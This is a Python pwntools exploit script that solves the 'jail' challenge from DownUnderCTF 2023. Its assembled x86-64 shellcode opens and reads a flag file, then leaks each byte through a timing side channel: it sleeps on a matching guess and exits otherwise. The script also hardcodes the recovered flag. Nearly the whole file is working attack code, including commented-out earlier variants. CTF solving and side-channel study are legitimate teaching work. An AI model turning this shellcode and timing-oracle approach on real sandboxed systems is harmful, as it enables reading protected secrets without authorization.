#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import time

from pwn import *

elf = context.binary = ELF("./jail", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 2023.ductf.dev 30010"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}

flag_len = 44

# j = 0
# while j < flag_len:
#     sc = f"""
#         mov rax, 0x7478742e6761
#         push rax
#         mov rax, 0x6c662f6c6168632f
#         push rax
#         mov rsi, rsp
#         xor rdx, rdx
#         mov rax, 0x101
#         syscall
#
#         mov rdi, 3
#         sub rsp, 0x40
#         mov rsi, rsp
#         mov rdx, 0x40
#         mov rax, 0
#         syscall
#
#         xor rax, rax
#         mov al, byte ptr [rsp + {j}]
#         shr rax, 4
#         push 0
#         push rax
#         mov rdi, rsp
#         xor rsi, rsi
#         mov eax, 0x23
#         syscall
#     quit:
#         mov eax, 0x3c
#         syscall
#     """
#
#     # sc = f"""
#     #     mov rax, 0x7478742e6761
#     #     push rax
#     #     mov rax, 0x6c662f6c6168632f
#     #     push rax
#     #     mov rsi, rsp
#     #     xor rdx, rdx
#     #     mov rax, 0x101
#     #     syscall
#     #
#     #     mov rdi, 3
#     #     sub rsp, 0x40
#     #     mov rsi, rsp
#     #     mov rdx, 0x40
#     #     mov rax, 0
#     #     syscall
#     #
#     #     xor rax, rax
#     #     mov al, byte ptr [rsp + {j}]
#     #     cmp rax, 0x7d
#     #     jne quit
#     #     push 0
#     #     push 2
#     #     mov rdi, rsp
#     #     xor rsi, rsi
#     #     mov eax, 0x23
#     #     syscall
#     # quit:
#     #     mov eax, 0x3c
#     #     syscall
#     # """
#
#     context.log_level = "CRITICAL"
#     io = start()
#     io.sendlineafter(b"> ", asm(sc))
#     go = time.time()
#     io.recvall()
#     io.close()
#     stop = time.time()
#     context.log_level = "INFO"
#     print(j, stop - go)
#     # if stop - go > 2:
#     #     print(j)
#     #     break
#     j += 1


group = [4, 5, 4, 5, 4, 7, 5, 3, 6, 6, 0, 4, 6, 4, 6, 4, 3, 6, 5, 6, 5, 5,
         3, 6, 6, 5, 5, 6, 5, 6, 5, 5, 7, 3, 7, 5, 7, 5, 6, 3, 3, 4, 2, 7]

flag = b"DUCTF{S1de_Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}"
with log.progress("Enumerating") as prog:
    # for i in range(len(flag) + 1, len(group)):
    for i in range(9, len(flag)):
        for c in range(group[i] << 4, (group[i] + 1) << 4):
            # prog.status(f"{flag.decode()}{chr(c)}")
            sc = f"""
                mov rax, 0x7478742e6761
                push rax
                mov rax, 0x6c662f6c6168632f
                push rax
                mov rsi, rsp
                xor rdx, rdx
                mov rax, 0x101
                syscall

                mov rdi, 3
                sub rsp, 0x40
                mov rsi, rsp
                mov rdx, 0x40
                mov rax, 0
                syscall

                xor rax, rax
                mov al, byte ptr [rsp + {i}]
                cmp rax, {flag[i]}
                jne quit
                push 0
                push 2
                mov rdi, rsp
                xor rsi, rsi
                mov eax, 0x23
                syscall
            quit:
                mov eax, 0x3c
                syscall
            """
            context.log_level = "CRITICAL"
            io = start()
            io.sendlineafter(b"> ", asm(sc))
            go = time.time()
            io.recvall()
            io.close()
            stop = time.time()
            context.log_level = "INFO"
            if stop - go > 2:
                print(chr(flag[i]))
                # flag += bytes([c])
            else:
                print("wrong", chr(flag[i]))
            break
